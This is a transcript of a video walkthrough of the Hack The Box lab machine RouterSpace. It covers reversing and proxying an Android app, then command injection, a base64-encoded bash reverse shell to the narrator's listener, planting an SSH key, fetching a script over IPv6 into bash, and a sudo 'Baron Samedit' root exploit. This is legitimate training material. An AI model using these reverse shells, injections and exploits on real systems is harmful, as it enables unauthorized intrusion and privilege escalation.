 what's going on youtube is ipsec i'm doing router space from hack the box which is gonna cover something i don't have a lot of experience in and that is mobile applications but hopefully it still helps you with something um it starts off with trying to do some light reversing of the apk file and finding out that we don't really know how to read much of the code of it so we're going to go to the easier way and do some dynamic analysis by running the phone or running the app in a emulator and then intercepting its calls with burp suite there's a lot of trial and error that's spent to get this working um at first i tried to do the android sdk not jenny motion and the last time i did that was like back in 2016 for the holiday hack challenge from sans if you go to ipsec dot rock slash holiday hack 2016. you can find my right up there those instructions don't work anymore it was a pain back then it's still a pain but genymotion makes it easy so with that being said if you want to learn how to run an app and your vm this video is for you so let's hop in as always you start off with the nmap so dash sc for default scripts as v enumerate versions o a output all formats put in the nmap directory and call it router space then the ip address of 1010 11.148. this can take some time to run so i've already ran it looking at the results we have just ssh and http and looking at the ssh um it looks like it's like a custom server we have ssh 2.0 router space packet filtering version one so i'm not exactly sure what that is about and then on the http server we have a lot of weird things like suspicious activity detected request id i don't know what that is um it's part of the 404 request and is there anything else x powered by router space it's a cdn not exactly sure what that is i know it's a content delivery network but um nothing really to go off of yet right so let's just go take a look at the website so going to 10 10 11 148 we have looks like a web page it says connect to your routers with router space and if we click this get start now it goes nowhere scrolling through the page looking for like accounts emails things but it's just a bunch of ipsum there's a download link on both places so if we click download we get a apk file so that looks like all there is to this if we go features pricing contact nothing here so let's take a look at the apk so i'm going to move the apk i think it's just nope probably a capital r to here and then there's one tool that most people use when doing apks uh let's just make this directory apk so we stay a bit organized um it looks like when i ran my nmap scan i didn't actually put it in the directory so or i ran two scans i'm just going to clean that up because i ran it with sudo oh hey let me delete it okay so let's move on uh we can do apk tool dash h to see options and i want to say the option is d um i'm going to try just apk tool d router space and yeah there we go it is decoding it and if we go into the directory we have like the manifest file to see information out of here about um the application and honestly i don't know much about android apps and things like that so uh the knowledge you get here probably isn't going to be super helpful i'm kind of looking through this manifest directory nothing really there we see what packages it has the smallie is a java compiled byte code so when you do this reversing it doesn't compile straight to like just straight java cure like if it was a jar or something like that we're going to look at a different one to get a bit different view of it but generally when i go into a directory we have this um it's normally in the com directory you want to go to then called by the app router space and then we can see the smalley code for this or s molly i don't know how to pronounce it we can like look at build config to see exactly what it looks like nothing there but main application that seems like where i'd want to start so we can see here it's using facebook react so this is probably just a react web app a javascript thing i want to say but this isn't really helping me too much the other thing i could do if we go up a few directories we can do like grep dash r um i'm gonna do router space and see what's here um it's gonna be a lot of packages right so i'm gonna try cheating a little bit because we don't know the domain name yet but i do routerspace.hdb we do have something in a rsa certificate matches so let's take a look at that just to see what it is so rsa i'm gonna guess this is a signing key for the app uh we do have routersbase.htb so this is a ssl cert um let's see how do i view this the one thing that's throwing me off is normally like rsa certificates begin with like the dash dash dash begin rsa private or public key this doesn't have it um we could like base64 encode and potentially put it in but i'm guessing this is a different format um i'm just gonna do the thing you always do when you don't know and go to google i'm gonna type like android cert dot rsa view and let's see um [Music] new to cryptography that's using that a key tool print cert file let's try it key tool dash print cert dash file right yep put the file there and here we have it so this is one way we could get the host name by just viewing this ssl certificate there's a lot of good things you can do when you just decompile the app but um actually let's see is it bytecode viewer on this let's see if we can do it a different way viewer guess github maybe is this it yes this is it it's good releases just download this and show you um we're never doing anything in like android files if you get stuck uh the one thing i do in ctfs is always just try a different tool because um it's oddly complex and every tool behaves slightly differently right so we can run this jar let's see right code viewer then once let's just drag and drop the apk i wonder if i can do click and get a dialog box i can do add and we can do it this way ipsec hdb oh no i'm going to close this real quick uh apparently enter um tries to load the directory so it's probably gonna like try to pull every single thing which um not what i want this is a big directory so this router space apk and then this apk and then it's going to take probably 30 to 60 seconds for it to stop processing you can know it's processing because this bar up here ah that the progress was the top left not the bottom right but it's a java tool so but now that it's done we can click on the apk and we get a simple thing we can go com router space and compare like these main activities uh actually we did main application right and if we look does this look any different so this is the benefit of doing these things during a ctf you get to play with these tools see which one you like the most see if it's different if you have trouble you can then ask other people about it and find the other ways about it so when you accomplish or not accomplish well you will accomplish the box but when you come across this in the real world you have some type of experience about it right so this is like invoke direct new instance uh like that and invoke special is this the same i can't tell trying to make it bigger for you it does two decompile as i guess for inflow and bytecode decompiler um but this looks like it's near identical right it's still got these invoked words um but i want to say bytecode viewer is a bit more readable than just going to the somali code um i'm sure if you go to blog posts there's gonna be people that know way more about this subject than me but um always try other things right um the next thing we want to do though is just run this application now i don't have an android phone so i can't just run this on my phone and even if i did probably wouldn't um the installing android on ubuntu if you use like the general sdk whatever it's called it's a huge royal pain and has a lot of bugs the easiest way is to use a tool called jenny motion or at least i believe this is the easiest way uh oxdf taught me a lot on this part because it is very very very very particular with how you do things on this um like the sdk manager is just a pain to get android running especially in a vm and then it's a pain to get the proxy working so you can use brep suite to intercept things probably because like um certificates or something like that i don't know or maybe something weird on the networking stack um jenny motion seems to be the easiest to get that working with but it's still picky about what um android version you pick so let's just download jennymotion and this is free for personal use so move downloads genymotion and then we can just execute genymotion after we make it executable and this is going to install it i'm going to install it into this directory because i don't plan on running it for a while well running it after this video so it's not in a good location the one thing i didn't mention is i did an apt install virtualbox to set up virtualbox on this and then another thing you will need um if you go in your settings of your vm because you're going to do nested virtualization you have to go to your processor and make sure it is checked like this virtualized thing if it's not then i think virtualbox won't work or it'll be extremely slow so you have to enable that and if you're not running a vm on your host you have to go into your main bios and enable it there um and if your vms just run slow on your host um check your bios and enable the virtualization option but it's telling me i can run genymotion from this directory so let's do it so go here dot slash jenny motion and let's see i am going to delete this is from testing the box or testing it let's just create a new one let's do a google nexus 5 sounds good next i hope i did nexus i think i did a pixel last time i wonder if i'm going to have issues android version i'll leave it at 4.4 this looks fine creating device okay now we can click start to start this up and we should get a um android device so there we go it is loading and then once it's up we need to make sure our apk can run on it because this is running an ancient version i believe of android because we chose um like i forget what was it 4.4 or maybe eight let's see what version was it so google nexus 4.4 and if i did a pixel google nexus let's see let's just try dropping the app now that it's here so where is it where is file manager let's see places home i can go hdb router space apk and we have this drop it here and we have an error i'm going to guess this is too old um i don't know exactly where the log is i guess we could look at it here and see what it is less it has space in it let's see apk adb client unknown performing push install install failed old sdk so our version is too old i guess so i'm just going to search for pixel and we can run i've eight version let's try just google pixel this is 8.1 oh i don't want to nine let's just leave it at 8.1 and keep going and this is i guess the painful part of this box even with jenny motion is figuring out a um good device and sometimes i've been able to get like the apk on it and then for some reason this version of the device doesn't want to send data to my proxy which is doubly annoying right so there's two battles to win the first one is getting a device up and running that accepts your apk the second one is setting up all the networking so you can [Music] intercept the traffic and analyze it so android is booting up and the one thing i did not do if we we can probably edit this one and look at it um i generally put networking on bridge mode so it's just not an added because i just have weird issues on that every now and then i generally like bridge mode but since when bridged we'll keep going with bridge and see what happens we can drop router space here file transfer in progress and come on it's better it didn't immediately hang or fail right so i assume it is transferring i don't wanna i guess can we click no oh yeah we can so if we click up near the top and go to settings this is where we can set the proxy so go here network and i think we just click and hold on this i maybe click on wi-fi oh i turned it off turn it back on then click and hold on android wi-fi modify network advanced options then we want to set a proxy to manual and actually before i do this let's go to none real quick cancel i'm going to click on this my ip address is 100315 and my gateway is 10032 the gateway is going to be my box um if i do ipaddr uh let's see grep 10 0 i don't see a 1032 here i'm gonna guess it's going to work um my virtualbox ip is 192.168.56.1 but i'm not exactly sure what's going on here this is why i generally do natting i'm not adding bridge mode because if i did bridged i just do eat zeros ip right but i'm going to try 1032 real quick and see if this works so click and hold on the android wi-fi here modify advanced options manual and then 10 0 3 2 and maybe you can use both um i actually don't know but let's just save this and then in burp suite what we have to do is go to our proxy options and no longer listen on 127.001 we can listen on all interfaces and now if i go to the intercept tab and if this works we will be able to um the home buttons down here but if this works we will be able to intercept a request i'm going to go to google.com and we do we see it down here so that is good so the next thing to do would be click here back at home i'm going to drag up and then go to router space and we want to intercept and see what connection this makes so we keep going still nothing i click check status and we can see it make a request and it's requesting routerspace.hdb the same place we saw in that ssl certificate or maybe the rsa certificate i should say i guess but let's do v etsy host and now 10 10 11 146 148 actually is the ip i want to say and then if i for this request we can see hey the router is working fine right so if we put this in repeater let's just minimize this we can see uh what the server not respond to us unknown routerspace.htb copy send there we go um either i have a typo here r-o-u-t-e or s-p-a-c-e or there's some weird dns caching but we have it here um we could try putting not ip so if i do abc uh it's echoing that back um if we do space one we have that if we put this without json what happens if i just do zero right it's still going to echo it right uh if i do a now we get some type of error it's doing a json parse message le breed i'm just saying there's anything that i see that stands out here um don't really see anything we can try like special characters a semicolon does not get printed about an exclamation point a dollar dollar does dollar host and doesn't so this is definitely going into um some type of parsing thing now right i don't think dollar hurst would give me anything but um it's not printing the dollar it does the print the dollar when there's nothing afterwards but that will also terminate a character will a pound pound space that does not but semicolon also doesn't so i'm going to do like a command afterwards so like id and we have this running um if this didn't work i would probably go back to my host do a witch id and give it the full path in case the path isn't being set correctly but at this point we have command injection so we should do a reverse shell the painful thing is like we have these quotes so i'm just going to base64 and code it so we have less special characters so um echo then we can do bash dash c bash dash i like that 10 10 14 8 9 000 one zero and one like that i just want to make sure this looks fine on the clipboard base64-w0 and we can copy this i actually don't like that plus so i'm going to eyeball it put in the space here gets rid of this plus we're going to get rid of that next plus as well and the main reason i want to get rid of the pluses is i was lazy and didn't test it if i do echo this um it's not url decoding this plus so we don't have to get rid of it um but that is why i'm doing it because if i did this and then it had this as a space and not a plus then the base64 string would be breaking when i send it right so this is just being careful not to break that uh we can do a and now echo paster base64 base64-d we can see everything looks good except okay yeah it's still just echoing and then bash so nc lvmp 9001 send it it hangs we don't get a response back and hang so it looks like we are but we aren't so there may be some type of firewall going on here or maybe this is running in a docker or something like that so the first thing i'm going to check is the ls.a on slash and oh man this printing is awful i wonder if i copy and paste this so if i echo like this i wonder is there print f there we go printf works so uh what was i looking for i was looking for a slash dot like dot docker m right and i don't see that so i don't think i'm running in a virtual environment um at least on this machine i guess it could be lxc or some other virtualization technology but i don't think so at this point we could run like a unname dash a sometimes that helps tell us but we're just running ubuntu so let's run who am i we are paul lsla on home paul and i want to copy this so print f already put a quote there and we have a ssh directory we also have the user.txt so ssh copy echo or printf nothing here so we have to create a ssh key i'm going to do ssh keygen dash f paul and then catpol.pub there we go i'm going to base64 it dash w0 so we put it all on one line and now when i copy this i can do a echo base64-d and direct it to home paul authorized keys and then sh-i paul paul at 10 10 11 148 click yes and we are disconnected so that did not work let's do a cat home paul sh authorized keys and that is surprising let's do ls okay wonder what is wrong with this command ls on this did i who am i that works let's put it like this okay we got code execution this way home paul ssh it's returning we just didn't create anything so let's redo this and try pasting it in this way base64-d home paul ssh authorized keys so that's good now i wonder if i did not terminate the quote burp is being really weird how it shows me this or the there we go so yeah that definitely looks right i'm going to put this in a new window and then we can just do it ls home paul ssh it's got an authorized key file now s-h-i with paul and we are in so the first thing i want to look at is ssh because if you remember uh we had that weird ssh banner right this ssh 2.0 router space packet filtering thing um i guess this is a hint that there was a firewall in hindsight um but if we do etsy ssh let's do sshd config and just see if they put the banner there right um filter i don't see that at all are they running a custom ssh server actually let's see cat and map router space dot nmap crap ssh dash i so i'm going to look for this string so grep dash r paste this in and i am not finding it grep r everything is denied so ps ef ef grep ssh user spin ssh startup so this is looking like um the standard ssh server let's see strings shd grep so that's actually compiled into the ssh server what so huh see is this stat shd stat sgdisk okay well uh when i went down this rabbit hole it's not something i had expected right but we just found something that the author did and instead of just editing the banner i think in the config he added it in the ssh server so maybe this is a rapid hole maybe it's another thing that's on the box but the reason why i'm thinking it's custom edited is this user aspen directory is managed generally by um a package manager if you wanted to print something i think there's user local s-pen which is where like this binary should have gone because that's not managed by the package manager if i update ssh on the server there's a chance this gets wiped right but we can tell that because package managers they don't store the full time in a 32-bit timestamp so the ssh server being modified and having this full timestamp likely means this was manly placed on the server and not by the package manager like if i do a stat grep on modify and then we just i hate that i don't have up grab modify grep v and we hide everything like this there's probably only going to be one file and that is because it is the um sshd server so that is interesting but the easiest way to priv-esque especially on relatively easy boxes or like easy rated i think this one is either easy or medium i forget exactly what difficulty level this is but to always run lin p's the linux privilege escalation script awesome sweet i always like downloading it again because it does update from time to time i think this is last updated may 11th so yes what is releases let's get out of this master blend piece get out of tree there we go go to releases linps.sh save it and then we can make dirt www and then cp oh i wonder do i have curl 10 10 14 8 nc lvnp um let's just do 80 like this i don't have the way to um download this over web because the firewall so what we can do is go into [Music] real quick side tangent let's see it firewalls normally under etsy is it sysconfig or network find dot grep ipt cd iptables there we go we have rules files so i don't know the default size of an iptablesrules.v4 file but if i did we may be able to tell if it's modified but we could also no both roles um v6 and v4 are similar let's see it looks like ipv6 hasn't been modified so maybe it can get off this box over ipv6 we could try that everyone knows how to ssh right we could always just try x filling over ipv6 because this raw file looks untouched 1655. i'm just saying if there's a telltale sign 217 i don't know um but ipv6 sounds fun right now so let's try this ton zero i am this ping six i can ping myself so nc lvmp80 i am listing on ipv6 right so curl let's see curl dash 6 http like this let's see curl girl ipv6 is there a flag dash interface dash g six girl see it also put the ipn brackets the last time i did this is probably my sneaky video like and hacked the box many years ago right so hopefully we get this working hey ipv6 does get out um that's actually pretty cool i want to get back real quick another tangent um actually we're at the end of the video but yeah so ipv6 does get out of this box we could do lin p's this way so go back in my dub dub dub move downloads lin p's here and we can now do this curl right and then slash lin p well let's do port 8000 and then slash linps.sh server and the reason why ips i should have remembered this but ips need be in brackets because ipv6 uses colons not periods which are also used for ports so that's why you wrap an ip address and ipv6 in brackets type it over to bash and it is refused let's see um because this is not listening on ipv6 um http server let's see find what if i specify the address if this supports ipv6 i don't think this one supports ipv6 so we could probably run netcat probably lvmp 8000 do we have nc here we do nc-6 like this eight thousand see nc six eight thousand bash nc-6 dead beef there we go pipe it to bash and we'll send lin p's here so listening on all ports port 8000 and then sending it the contents of limpese.sh we're grabbing it here and sending that to bash and here we go we're going to run lin p's i'm going to pause the video let the script finish and then we will go over it so i'm not positive this is still running or not but i'm just going to ctrl c it and we can go near the top so if i look at it we can just go through everything um let's see here we go so the very first thing it says is this cve 2021 3560. so let's google exactly what this is and this is a poll kit and i want to say this requires pk exec let's see which pk exec lsla on this file and that is set uid so this exploit may actually work actually it requires um gnome control center actually i think so maybe it doesn't i want to say i thought i remembered removing this a long time ago maybe it did not him confusing the machines oh wait uh i ran that on my host machine it's been a while since i updated my box i guess or maybe um that was the latest date but which pk exec it helps if i run the commands on the machine that i'm intended to run right not set uid anyways so i think it requires norm control center and for it to be set uid there um cv 2021 so 3560 is pwn kit or a pull kit and then we have phone kit this one's definitely pk exec we have this sam edit one if we google this see do we have a good repo we could read this see how complicated it is let's see if we go this it does give instructions so you can check if your version of studio is vulnerable by doing sudo edit s capital y if it asks you for the password it's most likely vulnerable so that's nice to know if we do this it's getting a password so we just need to make and exploit so let's download this um i'm just going to copy and paste them in so v exploit dot c set paste okay then the next one is shellcode.c and let's see reacts so this is going to oh it's commented out so once i paste it i'll explain shellcode.c set paste so how this is written is the comments or what the [Music] assembly is going to be so set uid is moving 105 in rax then moving 1 and rdi which is going to be the first argument then calling syscall so i bet if we did um let's see x86 syscall convention maybe if i probably just did man cisco um see syscall table table's probably a better word this is probably better 64-bit um what is the call set uid uh 105. oh it is 105. for some reason i thought i said 104 maybe i did but we can see yep rex it's moving the syscall number into that and then executing it right gid 106 so you can see kind of how this works right then sh so if we look at exec v e it's 59 and then it's putting all the arguments you need so that's how that piece of code works the next thing we need define where we were it's on this one uh we need the make file the make file and i didn't check if um like we had compiling tools on this hopefully we do unless we have to copy it on our machine if i just do make looks like we do dot slash exploit id we are root so hope you guys enjoy this video take care and i will see you all next week oh wait no um i said i was gonna try to get a reverse shell over ipv6 didn't i so let's try that um i haven't actually done this trick before i don't think so maybe i have so what we want to do is that echo um let's see ben let's see bash there we go dev tcp is this going to work can we just do this um let's see ipaddr let's do this like that i'm going to put it in i'm not going to put it in brackets we're going to try it without because in this syntax um port is by a slash so that's why i'm not putting it in brackets and i wonder if there's lsdev tcp tcp assuming there was an easy way to tell if there was a tcp six um but we'll check in a minute echo this base64 d bash nc lvnp 9001 run it it hangs but we kind of we get a connection so we no we're on the box who am i paul so yep that does work um we could have done ipv6 and skipped that whole ssh thing so hope you guys enjoyed the video take care i want to see you all next week